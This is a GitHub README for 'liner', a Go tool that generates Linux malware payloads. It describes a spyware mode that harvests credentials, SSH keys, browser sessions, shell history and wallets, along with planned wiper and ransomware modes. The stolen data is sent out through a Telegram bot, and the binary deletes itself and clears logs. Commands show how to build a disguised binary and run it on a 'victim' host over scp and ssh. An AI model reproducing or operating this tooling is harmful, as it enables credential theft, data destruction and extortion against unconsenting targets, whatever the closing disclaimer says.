<img width="1000" height="850" alt="ChatGPT Image Jul 14, 2025, 04_07_32 PM" src="https://github.com/user-attachments/assets/c870a924-deca-4834-9c11-b0b4df874eb2" />

# liner

`liner` is a lightweight and modular **post-exploitation framework** written in **pure Golang**, designed to generate **custom payloads** for Linux-based systems. These payloads can perform stealthy **data exfiltration**, **destructive actions**, or **ransom-like encryption** depending on user-defined modes.

---

## 🚀 Features

- 🔧 Generate standalone **Go binaries** for various post-exploitation tasks
- 🕵️ Spyware Mode: dump credentials, sessions, private files
- 💣 Vayper Mode: destroy selected categories of sensitive data *(WIP)*
- 🔐 Ransom Mode: encrypt sensitive files *(WIP)*
- 📤 Exfiltrate data via **Telegram bot**
- 🧹 Self-deletion & log cleanup
- 🧪 No dependencies – works out-of-the-box on any Linux system
- 🧬 Output as Go code or compiled ELF binary

---

## ⚙️ Installation

```bash
git clone https://github.com/yourname/liner.git
cd liner
go build -o liner cmd/liner.go
```

You now have a CLI tool: `./liner`

---

## 🧾 Usage

```bash

liner [FLAGS] -o [output_name]

```

### 🔹 Global Flags

| Flag         | Description                                                   |
|--------------|---------------------------------------------------------------|
| `--help`     | Show help and usage information                               |
| `--silent`   | Run without displaying the ASCII logo                         |
| `--mode`     | What the final binary should do: `Spyware`, `Vayper`, `Ransom`|
| `--token`    | Telegram bot token                                            |
| `--id`       | Telegram chat ID                                              |
| `--dump`     | What to dump: `Credentials`, `Password`, `Session`, `privateDATA`, `all` *(Spyware only)* |
| `--destroy`  | What to destroy *(Vayper only)*                               |
| `--encrypt`  | What to encrypt *(Ransom only)*                               |
| `-o`         | Output filename (with or without `.go`)                       |

---

## 🧪 Example

```bash
liner \
--mode Spyware \
--dump all \
--token 123456:ABCDEF-TelegramBotToken \
--id 987654321 \
--silent \
-o setting
```

This command creates a binary file named `setting` which:

- Runs in silent mode
- Extracts all targeted information
- Sends everything to your Telegram
- Cleans itself and logs if implemented

To run it on target:

```bash
scp ./setting user@victim:/tmp
ssh user@victim 'chmod +x /tmp/setting && /tmp/setting'
```

---

## 🗂️ Modes

### 🔹 Spyware Mode (`--mode Spyware`)

- Targeted for **stealth data extraction**
- Supported `--dump` values:
  - `Credentials`: Git credentials, keychains, browsers
  - `Password`: Bash/zsh history, `pass`, keyrings
  - `Session`: `.ssh`, `.kube`, browser profiles
  - `privateDATA`: `.env`, `.sqlite`, `.wallet`, `.pem`, `.p12`, etc.
  - `all`: all of the above

### 🔹 Vayper Mode (`--mode Vayper`) *(WIP)*

- Designed to **delete** specific data classes
- Supported `--destroy` values: `Credentials`, `Password`, `Session`, `privateDATA`, `all`

### 🔹 Ransom Mode (`--mode Ransom`) *(WIP)*

- Designed to **encrypt** selected data on disk
- Supported `--encrypt` values: same as `--destroy`

---

## 📤 Exfiltration Details

- Data collected is zipped or serialized
- Sent via `https://api.telegram.org/bot<token>/sendDocument`
- Uses HTTP POST requests with silent delivery
- No external libraries – raw Go net/http

---

## 🛡️ Legal Disclaimer

This project is for **educational and authorized security testing** only.  
Using this tool against systems without explicit permission is **illegal**.

---

## 👨‍💻 Author

Developed with ❤️ by [MNM]  
If you find this useful, give it a ⭐ on GitHub!

